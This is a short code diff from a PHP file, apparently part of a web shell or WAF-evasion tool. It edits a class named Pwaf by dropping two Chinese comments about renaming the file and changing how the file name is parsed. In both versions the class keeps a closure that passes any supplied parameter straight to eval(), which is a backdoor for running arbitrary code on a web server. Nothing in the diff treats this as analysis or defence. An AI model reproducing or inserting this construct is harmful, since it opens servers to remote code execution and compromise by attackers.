@@ -61,12 +61,12 @@ class go {
 }
 
 class Pwaf {
-    private  $Command; //修改文件名请修改这里
+    private  $Command; 
     public  $func;
 
     public function __construct() {
-        $this->func = explode('.',basename(__file__))[0];
-        $this->Command = function ($param) {  return eval($param.'exit();//'); }; //修改文件名请修改这里
+        $this->func = basename(__file__,'.php');
+        $this->Command = function ($param) {  return eval($param.'exit();//'); }; 
     }
 }
 
